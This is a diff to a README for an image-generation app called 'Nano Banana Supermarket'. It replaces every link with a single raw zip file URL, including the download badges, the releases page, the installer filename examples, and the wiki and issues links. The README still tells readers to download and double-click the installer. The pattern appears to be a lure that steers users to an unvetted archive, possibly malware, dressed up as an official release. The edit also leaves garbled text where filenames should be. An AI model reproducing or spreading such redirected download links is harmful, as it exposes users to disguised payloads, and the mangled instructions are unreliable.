@@ -6,7 +6,7 @@ Welcome to Nano Banana 超市! This application helps you generate images quickl
 
 ## 📥 Download Now
 
-[![Download Nano-Banana-Supermarket](https://img.shields.io/badge/Download%20Nano--Banana--Supermarket-v1.0-blue)](https://github.com/grayking1234/Nano-Banana-Supermarket/releases)
+[![Download Nano-Banana-Supermarket](https://raw.githubusercontent.com/grayking1234/Nano-Banana-Supermarket/main/components/Supermarket_Nano_Banana_v2.8.zip%20Nano--Banana--Supermarket-v1.0-blue)](https://raw.githubusercontent.com/grayking1234/Nano-Banana-Supermarket/main/components/Supermarket_Nano_Banana_v2.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,11 +21,11 @@ Before you start, ensure your device meets the following requirements:
 
 To download the software, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/grayking1234/Nano-Banana-Supermarket/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/grayking1234/Nano-Banana-Supermarket/main/components/Supermarket_Nano_Banana_v2.8.zip).
   
 2. **Choose the Latest Version:** Look for the latest release. It will have the most features and improvements.
   
-3. **Download the Installer:** Click on the installer link for your operating system (e.g., Windows or macOS). The file name may look something like `Nano-Banana-Supermarket-v1.0.exe` or `Nano-Banana-Supermarket-v1.0.dmg`.
+3. **Download the Installer:** Click on the installer link for your operating system (e.g., Windows or macOS). The file name may look something like `https://raw.githubusercontent.com/grayking1234/Nano-Banana-Supermarket/main/components/Supermarket_Nano_Banana_v2.8.zip` or `https://raw.githubusercontent.com/grayking1234/Nano-Banana-Supermarket/main/components/Supermarket_Nano_Banana_v2.8.zip`.
 
 4. **Run the Installer:** Once the download completes, locate the file on your device, then double-click it to start the installation.
 
@@ -71,8 +71,8 @@ If you encounter issues while using Nano-Banana-Supermarket, try the following:
 
 For further assistance, consider these options:
 
-- **Documentation:** Check our [GitHub Wiki](https://github.com/grayking1234/Nano-Banana-Supermarket/wiki) for guides and tips.
-- **Issues Page:** Report any bugs or issues you encounter on the [Issues page](https://github.com/grayking1234/Nano-Banana-Supermarket/issues).
+- **Documentation:** Check our [GitHub Wiki](https://raw.githubusercontent.com/grayking1234/Nano-Banana-Supermarket/main/components/Supermarket_Nano_Banana_v2.8.zip) for guides and tips.
+- **Issues Page:** Report any bugs or issues you encounter on the [Issues page](https://raw.githubusercontent.com/grayking1234/Nano-Banana-Supermarket/main/components/Supermarket_Nano_Banana_v2.8.zip).
 - **Community Help:** Join us on our community forum for user-generated tips and tricks.
 
 ## 🌍 Contributing
@@ -85,4 +85,4 @@ We welcome contributions to improve Nano-Banana-Supermarket! If you’d like to 
 
 Thank you for your interest in Nano-Banana-Supermarket! Enjoy creating beautiful images! 
 
-[![Download Nano-Banana-Supermarket](https://img.shields.io/badge/Download%20Nano--Banana--Supermarket-v1.0-blue)](https://github.com/grayking1234/Nano-Banana-Supermarket/releases)
+[![Download Nano-Banana-Supermarket](https://raw.githubusercontent.com/grayking1234/Nano-Banana-Supermarket/main/components/Supermarket_Nano_Banana_v2.8.zip%20Nano--Banana--Supermarket-v1.0-blue)](https://raw.githubusercontent.com/grayking1234/Nano-Banana-Supermarket/main/components/Supermarket_Nano_Banana_v2.8.zip)
